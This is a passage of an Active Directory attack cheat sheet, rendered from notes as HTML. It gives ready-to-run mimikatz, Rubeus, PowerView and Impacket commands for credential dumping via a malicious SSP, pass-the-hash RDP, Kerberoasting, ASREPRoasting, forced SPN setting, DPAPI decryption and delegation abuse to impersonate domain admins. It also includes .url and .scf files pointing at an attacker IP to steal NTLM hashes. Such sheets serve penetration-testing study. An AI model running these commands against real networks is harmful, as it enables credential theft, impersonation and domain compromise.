<li><a data-from-md title='https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland' href='https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland'>Bypassing LSA Protection in Userland</a></li>
</ul>
</li>
<li>
<p>LSA is running as virtualized process (LSAISO) by Credential Guard</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Check if a process called lsaiso.exe exists on the running processes
tasklist |findstr lsaiso

#If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
#Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
mimikatz # misc::memssp

#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log</pre><pre class="hljs"><code><span class="hljs-comment">#Check if a process called lsaiso.exe exists on the running processes</span>
tasklist |findstr lsaiso

<span class="hljs-comment">#If it does there isn&#x27;t a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.</span>
<span class="hljs-comment">#Lets inject our own malicious Security Support Provider into memory, for this example i&#x27;ll use the one mimikatz provides</span>
mimikatz <span class="hljs-comment"># misc::memssp</span>

<span class="hljs-comment">#Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log</span></code></pre></div>
</li>
<li>
<p><a data-from-md title='https://adsecurity.org/?page_id=1821' href='https://adsecurity.org/?page_id=1821'>Detailed Mimikatz Guide</a></p>
</li>
<li>
<p><a data-from-md title='https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a' href='https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a'>Poking Around With 2 lsass Protection Options</a></p>
</li>
</ul>
<h3 id="remote-desktop-protocol">Remote Desktop Protocol</h3>
<p>If the host we want to lateral move to has &quot;RestrictedAdmin&quot; enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.</p>
<ul>
<li>
<p>Mimikatz:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the &quot;/restrictedadmin&quot; flag
privilege::debug
sekurlsa::pth /user:&lt;Username&gt; /domain:&lt;DomainName&gt; /ntlm:&lt;NTLMHash&gt; /run:&quot;mstsc.exe /restrictedadmin&quot;

#Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated</pre><pre class="hljs"><code><span class="hljs-comment">#We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the &quot;/restrictedadmin&quot; flag</span>
privilege::debug
sekurlsa::pth /user:&lt;Username&gt; /domain:&lt;DomainName&gt; /ntlm:&lt;NTLMHash&gt; /run:<span class="hljs-string">&quot;mstsc.exe /restrictedadmin&quot;</span>

<span class="hljs-comment">#Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated</span></code></pre></div>
</li>
<li>
<p>xFreeRDP:</p>
</li>
</ul>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:&lt;Username&gt; /pth:&lt;NTLMHash&gt; /v:&lt;Hostname | IPAddress&gt;</pre><pre class="hljs"><code>xfreerdp  +compression +clipboard /dynamic<span class="hljs-literal">-resolution</span> +toggle<span class="hljs-literal">-fullscreen</span> /cert<span class="hljs-literal">-ignore</span> /bpp:<span class="hljs-number">8</span>  /u:&lt;Username&gt; /pth:&lt;NTLMHash&gt; /v:&lt;Hostname | IPAddress&gt;</code></pre></div>
<p>:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: &quot;HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin&quot;.</p>
<h3 id="url-file-attacks">URL File Attacks</h3>
<ul>
<li>
<p>.url file</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">[InternetShortcut]
URL=whatever
WorkingDirectory=whatever
IconFile=\\&lt;AttackersIp&gt;\%USERNAME%.icon
IconIndex=1</pre><pre class="hljs"><code><span class="hljs-section">[InternetShortcut]</span>
<span class="hljs-attr">URL</span>=whatever
<span class="hljs-attr">WorkingDirectory</span>=whatever
<span class="hljs-attr">IconFile</span>=\\&lt;AttackersIp&gt;\%USERNAME%.icon
<span class="hljs-attr">IconIndex</span>=<span class="hljs-number">1</span></code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">[InternetShortcut]
URL=file://&lt;AttackersIp&gt;/leak/leak.html</pre><pre class="hljs"><code>[InternetShortcut]
URL=file:<span class="hljs-regexp">//</span>&lt;AttackersIp&gt;<span class="hljs-regexp">/leak/</span>leak.html</code></pre></div>
</li>
<li>
<p>.scf file</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">[Shell]
Command=2
IconFile=\\&lt;AttackersIp&gt;\Share\test.ico
[Taskbar]
Command=ToggleDesktop</pre><pre class="hljs"><code><span class="hljs-section">[Shell]</span>
<span class="hljs-attr">Command</span>=<span class="hljs-number">2</span>
<span class="hljs-attr">IconFile</span>=\\&lt;AttackersIp&gt;\Share\test.ico
<span class="hljs-section">[Taskbar]</span>
<span class="hljs-attr">Command</span>=ToggleDesktop</code></pre></div>
</li>
</ul>
<p>Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. <strong>Note</strong> that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.</p>
<p>:exclamation: .scf file attacks won't work on the latest versions of Windows.</p>
<h3 id="useful-tools">Useful Tools</h3>
<ul>
<li><a data-from-md title='https://github.com/besimorhino/powercat' href='https://github.com/besimorhino/powercat'>Powercat</a> netcat written in powershell, and provides tunneling, relay and portforward<br>
capabilities.</li>
<li><a data-from-md title='https://github.com/Mr-Un1k0d3r/SCShell' href='https://github.com/Mr-Un1k0d3r/SCShell'>SCShell</a> fileless lateral movement tool that relies on ChangeServiceConfigA to run command</li>
<li><a data-from-md title='https://github.com/Hackplayers/evil-winrm' href='https://github.com/Hackplayers/evil-winrm'>Evil-Winrm</a> the ultimate WinRM shell for hacking/pentesting</li>
<li><a data-from-md title='https://github.com/antonioCoco/RunasCs' href='https://github.com/antonioCoco/RunasCs'>RunasCs</a> Csharp and open version of windows builtin runas.exe</li>
<li><a data-from-md title='https://github.com/Greenwolf/ntlm_theft.git' href='https://github.com/Greenwolf/ntlm_theft.git'>ntlm_theft</a> creates all possible file formats for url file attacks</li>
</ul>
<h2 id="domain-privilege-escalation">Domain Privilege Escalation</h2>
<h3 id="kerberoast">Kerberoast</h3>
<p><em>WUT IS DIS?:</em> <br>
All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a &quot;user&quot;<br>
account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.</p>
<ul>
<li>
<p>PowerView:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Get User Accounts that are used as Service Accounts
Get-NetUser -SPN

#Get every available SPN account, request a TGS and dump its hash
Invoke-Kerberoast

#Requesting the TGS for a single account:
Request-SPNTicket

#Export all tickets using Mimikatz
Invoke-Mimikatz -Command '&quot;kerberos::list /export&quot;'</pre><pre class="hljs"><code><span class="hljs-comment">#Get User Accounts that are used as Service Accounts</span>
<span class="hljs-built_in">Get-NetUser</span> <span class="hljs-literal">-SPN</span>

<span class="hljs-comment">#Get every available SPN account, request a TGS and dump its hash</span>
<span class="hljs-built_in">Invoke-Kerberoast</span>

<span class="hljs-comment">#Requesting the TGS for a single account:</span>
<span class="hljs-built_in">Request-SPNTicket</span>

<span class="hljs-comment">#Export all tickets using Mimikatz</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;kerberos::list /export&quot;&#x27;</span></code></pre></div>
</li>
<li>
<p>AD Module:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Get User Accounts that are used as Service Accounts
Get-ADUser -Filter {ServicePrincipalName -ne &quot;$null&quot;} -Properties ServicePrincipalName</pre><pre class="hljs"><code><span class="hljs-comment">#Get User Accounts that are used as Service Accounts</span>
<span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Filter</span> {ServicePrincipalName <span class="hljs-operator">-ne</span> <span class="hljs-string">&quot;<span class="hljs-variable">$null</span>&quot;</span>} <span class="hljs-literal">-Properties</span> ServicePrincipalName</code></pre></div>
</li>
<li>
<p>Impacket:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; -outputfile &lt;FileName&gt;</pre><pre class="hljs"><code>python GetUserSPNs.py &lt;DomainName&gt;/&lt;DomainUser&gt;:&lt;Password&gt; <span class="hljs-literal">-outputfile</span> &lt;FileName&gt;</code></pre></div>
</li>
<li>
<p>Rubeus:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Kerberoasting and outputing on a file with a spesific format
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;

#Kerberoasting whle being &quot;OPSEC&quot; safe, essentially while not try to roast AES enabled accounts
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec

#Kerberoast AES enabled accounts
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes

#Kerberoast spesific user account
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple

#Kerberoast by specifying the authentication credentials
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;</pre><pre class="hljs"><code><span class="hljs-comment">#Kerberoasting and outputing on a file with a spesific format</span>
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt;

<span class="hljs-comment">#Kerberoasting whle being &quot;OPSEC&quot; safe, essentially while not try to roast AES enabled accounts</span>
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /rc4opsec

<span class="hljs-comment">#Kerberoast AES enabled accounts</span>
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /aes

<span class="hljs-comment">#Kerberoast spesific user account</span>
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /user:&lt;username&gt; /simple

<span class="hljs-comment">#Kerberoast by specifying the authentication credentials</span>
Rubeus.exe kerberoast /outfile:&lt;fileName&gt; /domain:&lt;DomainName&gt; /creduser:&lt;username&gt; /credpassword:&lt;password&gt;</code></pre></div>
</li>
</ul>
<h3 id="asreproast">ASREPRoast</h3>
<p><em>WUT IS DIS?:</em> <br>
If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted<br>
blob and bruteforce it offline.</p>
<ul>
<li>PowerView: <code class="inline-code">Get-DomainUser -PreauthNotRequired -Verbose</code></li>
<li>AD Module: <code class="inline-code">Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth</code></li>
</ul>
<p>Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!<br>
Check for interesting permissions on accounts:</p>
<p><strong>Hint:</strong> We add a filter e.g. RDPUsers to get &quot;User Accounts&quot; not Machine Accounts, because Machine Account hashes are not crackable!</p>
<p>PowerView:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &quot;RDPUsers&quot;}
Disable Kerberos Preauth:
Set-DomainObject -Identity &lt;UserAccount&gt; -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose</pre><pre class="hljs"><code><span class="hljs-built_in">Invoke-ACLScanner</span> <span class="hljs-literal">-ResolveGUIDs</span> | ?{<span class="hljs-variable">$_</span>.IdentinyReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;RDPUsers&quot;</span>}
Disable Kerberos Preauth:
<span class="hljs-built_in">Set-DomainObject</span> <span class="hljs-literal">-Identity</span> &lt;UserAccount&gt; <span class="hljs-operator">-XOR</span> <span class="hljs-selector-tag">@</span>{useraccountcontrol=<span class="hljs-number">4194304</span>} <span class="hljs-literal">-Verbose</span>
Check <span class="hljs-keyword">if</span> the value changed:
<span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-PreauthNotRequired</span> <span class="hljs-literal">-Verbose</span></code></pre></div>
<ul>
<li>
<p>And finally execute the attack using the <a data-from-md title='https://github.com/HarmJ0y/ASREPRoast' href='https://github.com/HarmJ0y/ASREPRoast'>ASREPRoast</a> tool.</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Get a spesific Accounts hash:
Get-ASREPHash -UserName &lt;UserName&gt; -Verbose

#Get any ASREPRoastable Users hashes:
Invoke-ASREPRoast -Verbose</pre><pre class="hljs"><code><span class="hljs-comment">#Get a spesific Accounts hash:</span>
<span class="hljs-built_in">Get-ASREPHash</span> <span class="hljs-literal">-UserName</span> &lt;UserName&gt; <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#Get any ASREPRoastable Users hashes:</span>
<span class="hljs-built_in">Invoke-ASREPRoast</span> <span class="hljs-literal">-Verbose</span></code></pre></div>
</li>
<li>
<p>Using Rubeus:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Trying the attack for all domain users
Rubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;

#ASREPRoast spesific user
Rubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;

#ASREPRoast users of a spesific OU (Organization Unit)
Rubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</pre><pre class="hljs"><code><span class="hljs-comment">#Trying the attack for all domain users</span>
Rubeus.exe asreproast /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;

<span class="hljs-comment">#ASREPRoast spesific user</span>
Rubeus.exe asreproast /user:&lt;username&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;

<span class="hljs-comment">#ASREPRoast users of a spesific OU (Organization Unit)</span>
Rubeus.exe asreproast /ou:&lt;OUName&gt; /format:&lt;hashcat|john&gt; /domain:&lt;DomainName&gt; /outfile:&lt;filename&gt;</code></pre></div>
</li>
<li>
<p>Using Impacket:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Trying the attack for the specified users on the file
python GetNPUsers.py &lt;domain_name&gt;/ -usersfile &lt;users_file&gt; -outputfile &lt;FileName&gt;</pre><pre class="hljs"><code><span class="hljs-comment">#Trying the attack for the specified users on the file</span>
python GetNPUsers.py &lt;domain_name&gt;/ <span class="hljs-literal">-usersfile</span> &lt;users_file&gt; <span class="hljs-literal">-outputfile</span> &lt;FileName&gt;</code></pre></div>
</li>
</ul>
<h3 id="password-spray-attack">Password Spray Attack</h3>
<p>If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse<br>
on other domain accounts.</p>
<p><strong>Tools:</strong></p>
<ul>
<li><a data-from-md title='https://github.com/dafthack/DomainPasswordSpray' href='https://github.com/dafthack/DomainPasswordSpray'>DomainPasswordSpray</a></li>
<li><a data-from-md title='https://github.com/byt3bl33d3r/CrackMapExec' href='https://github.com/byt3bl33d3r/CrackMapExec'>CrackMapExec</a></li>
<li><a data-from-md title='https://github.com/wavestone-cdt/Invoke-CleverSpray' href='https://github.com/wavestone-cdt/Invoke-CleverSpray'>Invoke-CleverSpray</a></li>
<li><a data-from-md title='https://github.com/Greenwolf/Spray' href='https://github.com/Greenwolf/Spray'>Spray</a></li>
</ul>
<h3 id="force-set-spn">Force Set SPN</h3>
<p><em>WUT IS DIS ?:<br>
If we have enough permissions -&gt; GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it.</em></p>
<ul>
<li>
<p>PowerView:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Check for interesting permissions on accounts:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match &quot;RDPUsers&quot;}

#Check if current user has already an SPN setted:
Get-DomainUser -Identity &lt;UserName&gt; | select serviceprincipalname

#Force set the SPN on the account:
Set-DomainObject &lt;UserName&gt; -Set @{serviceprincipalname='ops/whatever1'}</pre><pre class="hljs"><code><span class="hljs-comment">#Check for interesting permissions on accounts:</span>
<span class="hljs-built_in">Invoke-ACLScanner</span> <span class="hljs-literal">-ResolveGUIDs</span> | ?{<span class="hljs-variable">$_</span>.IdentinyReferenceName <span class="hljs-operator">-match</span> <span class="hljs-string">&quot;RDPUsers&quot;</span>}

<span class="hljs-comment">#Check if current user has already an SPN setted:</span>
<span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-Identity</span> &lt;UserName&gt; | <span class="hljs-built_in">select</span> serviceprincipalname

<span class="hljs-comment">#Force set the SPN on the account:</span>
<span class="hljs-built_in">Set-DomainObject</span> &lt;UserName&gt; <span class="hljs-literal">-Set</span> <span class="hljs-selector-tag">@</span>{serviceprincipalname=<span class="hljs-string">&#x27;ops/whatever1&#x27;</span>}</code></pre></div>
</li>
<li>
<p>AD Module:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Check if current user has already an SPN setted
Get-ADUser -Identity &lt;UserName&gt; -Properties ServicePrincipalName | select ServicePrincipalName

#Force set the SPN on the account:
Set-ADUser -Identiny &lt;UserName&gt; -ServicePrincipalNames @{Add='ops/whatever1'}</pre><pre class="hljs"><code><span class="hljs-comment">#Check if current user has already an SPN setted</span>
<span class="hljs-built_in">Get-ADUser</span> <span class="hljs-literal">-Identity</span> &lt;UserName&gt; <span class="hljs-literal">-Properties</span> ServicePrincipalName | <span class="hljs-built_in">select</span> ServicePrincipalName

<span class="hljs-comment">#Force set the SPN on the account:</span>
<span class="hljs-built_in">Set-ADUser</span> <span class="hljs-literal">-Identiny</span> &lt;UserName&gt; <span class="hljs-literal">-ServicePrincipalNames</span> <span class="hljs-selector-tag">@</span>{Add=<span class="hljs-string">&#x27;ops/whatever1&#x27;</span>}</code></pre></div>
</li>
</ul>
<p>Finally use any tool from before to grab the hash and kerberoast it!</p>
<h3 id="abusing-shadow-copies">Abusing Shadow Copies</h3>
<p>If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

#List shadow copies using diskshadow
diskshadow list shadows all

#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</pre><pre class="hljs"><code><span class="hljs-comment">#List shadow copies using vssadmin (Needs Admnistrator Access)</span>
vssadmin list shadows

<span class="hljs-comment">#List shadow copies using diskshadow</span>
diskshadow list shadows all

<span class="hljs-comment">#Make a symlink to the shadow copy and access it</span>
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\</code></pre></div>
<ol>
<li>You can dump the backuped SAM database and harvest credentials.</li>
<li>Look for DPAPI stored creds and decrypt them.</li>
<li>Access backuped sensitive files.</li>
</ol>
<h3 id="list-and-decrypt-stored-credentials-using-mimikatz">List and Decrypt Stored Credentials using Mimikatz</h3>
<p>Usually encrypted credentials are stored in:</p>
<ul>
<li><code class="inline-code">%appdata%\Microsoft\Credentials</code></li>
<li><code class="inline-code">%localappdata%\Microsoft\Credentials</code></li>
</ul>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:&quot;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;

#From the previous command we are interested to the &quot;guidMasterKey&quot; parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:&quot;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot;

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:&quot;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot; /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:&quot;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;</pre><pre class="hljs"><code><span class="hljs-comment">#By using the cred function of mimikatz we can enumerate the cred object and get information about it:</span>
dpapi::cred /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;</span>

<span class="hljs-comment">#From the previous command we are interested to the &quot;guidMasterKey&quot; parameter, that tells us which masterkey was used to encrypt the credential</span>
<span class="hljs-comment">#Lets enumerate the Master Key:</span>
dpapi::masterkey /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot;</span>

<span class="hljs-comment">#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:</span>
dpapi::masterkey /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;%appdata%\Microsoft\Protect\&lt;usersid&gt;\&lt;MasterKeyGUID&gt;&quot;</span> /rpc

<span class="hljs-comment">#We now have the masterkey in our local cache:</span>
dpapi::cache

<span class="hljs-comment">#Finally we can decrypt the credential using the cached masterkey:</span>
dpapi::cred /<span class="hljs-keyword">in</span>:<span class="hljs-string">&quot;%appdata%\Microsoft\Credentials\&lt;CredHash&gt;&quot;</span></code></pre></div>
<p>Detailed Article:<br>
<a data-from-md title='https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials' href='https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials'>DPAPI all the things</a></p>
<h3 id="unconstrained-delegation">Unconstrained Delegation</h3>
<p><em>WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a<br>
high value target or DA to connect to it, steal his TGT then ptt and impersonate him!</em></p>
<p>Using PowerView:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
Invoke-Mimikatz -Command '&quot;sekurlsa::tickets&quot;'

#Command to monitor any incoming sessions on our compromised server
Invoke-UserHunter -ComputerName &lt;NameOfTheComputer&gt; -Poll &lt;TimeOfMonitoringInSeconds&gt; -UserName &lt;UserToMonitorFor&gt; -Delay
&lt;WaitInterval&gt; -Verbose

#Dump the tickets to disk:
Invoke-Mimikatz -Command '&quot;sekurlsa::tickets /export&quot;'

#Impersonate the user using ptt attack:
Invoke-Mimikatz -Command '&quot;kerberos::ptt &lt;PathToTicket&gt;&quot;'</pre><pre class="hljs"><code><span class="hljs-comment">#Discover domain joined computers that have Unconstrained Delegation enabled</span>
<span class="hljs-built_in">Get-NetComputer</span> <span class="hljs-literal">-UnConstrained</span>

<span class="hljs-comment">#List tickets and check if a DA or some High Value target has stored its TGT</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;sekurlsa::tickets&quot;&#x27;</span>

<span class="hljs-comment">#Command to monitor any incoming sessions on our compromised server</span>
<span class="hljs-built_in">Invoke-UserHunter</span> <span class="hljs-literal">-ComputerName</span> &lt;NameOfTheComputer&gt; <span class="hljs-literal">-Poll</span> &lt;TimeOfMonitoringInSeconds&gt; <span class="hljs-literal">-UserName</span> &lt;UserToMonitorFor&gt; <span class="hljs-literal">-Delay</span>
&lt;WaitInterval&gt; <span class="hljs-literal">-Verbose</span>

<span class="hljs-comment">#Dump the tickets to disk:</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;sekurlsa::tickets /export&quot;&#x27;</span>

<span class="hljs-comment">#Impersonate the user using ptt attack:</span>
<span class="hljs-built_in">Invoke-Mimikatz</span> <span class="hljs-literal">-Command</span> <span class="hljs-string">&#x27;&quot;kerberos::ptt &lt;PathToTicket&gt;&quot;&#x27;</span></code></pre></div>
<p><strong>Note:</strong> We can also use Rubeus!</p>
<h3 id="constrained-delegation">Constrained Delegation</h3>
<p>Using PowerView and Kekeo:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">#Enumerate Users and Computers with constrained delegation
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth

#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo
tgt::ask /user:&lt;UserName&gt; /domain:&lt;Domain's FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain's FQDN&gt; /service:&lt;Service's SPN&gt;

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command '&quot;kerberos::ptt &lt;PathToTGS&gt;&quot;'</pre><pre class="hljs"><code><span class="hljs-comment">#Enumerate Users and Computers with constrained delegation</span>
<span class="hljs-built_in">Get-DomainUser</span> <span class="hljs-literal">-TrustedToAuth</span>
<span class="hljs-built_in">Get-DomainComputer</span> <span class="hljs-literal">-TrustedToAuth</span>

<span class="hljs-comment">#If we have a user that has Constrained delegation, we ask for a valid tgt of this user using kekeo</span>
tgt::ask /user:&lt;UserName&gt; /domain:&lt;Domain<span class="hljs-string">&#x27;s FQDN&gt; /rc4:&lt;hashedPasswordOfTheUser&gt;

#Then using the TGT we have ask a TGS for a Service this user has Access to through constrained delegation
tgs::s4u /tgt:&lt;PathToTGT&gt; /user:&lt;UserToImpersonate&gt;@&lt;Domain&#x27;</span>s FQDN&gt; /service:&lt;Service<span class="hljs-string">&#x27;s SPN&gt;

#Finally use mimikatz to ptt the TGS
Invoke-Mimikatz -Command &#x27;</span><span class="hljs-string">&quot;kerberos::ptt &lt;PathToTGS&gt;&quot;</span><span class="hljs-string">&#x27;</span></code></pre></div>
<p><em>ALTERNATIVE:</em><br>
Using Rubeus:</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="powershell" data-joplin-source-open="```powershell&#10;" data-joplin-source-close="&#10;```">Rubeus.exe s4u /user:&lt;UserName&gt; /rc4:&lt;NTLMhashedPasswordOfTheUser&gt; /impersonateuser:&lt;UserToImpersonate&gt; /msdsspn:&quot;&lt;Service's SPN&gt;&quot; /altservice:&lt;Optional&gt; /ptt</pre><pre class="hljs"><code>Rubeus.exe s4u /user:&lt;UserName&gt; /rc4:&lt;NTLMhashedPasswordOfTheUser&gt; /impersonateuser:&lt;UserToImpersonate&gt; /msdsspn:<span class="hljs-string">&quot;&lt;Service&#x27;s SPN&gt;&quot;</span> /altservice:&lt;Optional&gt; /ptt</code></pre></div>
<p>Now we can access the service as the impersonated user!</p>
<p>:triangular_flag_on_post: <strong>What if we have delegation rights for only a spesific SPN? (e.g TIME):</strong></p>
<p>In this case we can still abuse a feature of kerberos called &quot;alternative service&quot;. This allows us to request TGS tickets for other &quot;alternative&quot; services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.</p>
<h3 id="resource-based-constrained-delegation">Resource Based Constrained Delegation</h3>
<p><em>WUT IS DIS?: <br>
TL;DR <br>
If we have GenericALL/GenericWrite privileges on a machine account object of a domain, we can abuse it and impersonate ourselves as any user of the domain to it. For example we can impersonate Domain Administrator and have complete access.</em></p>
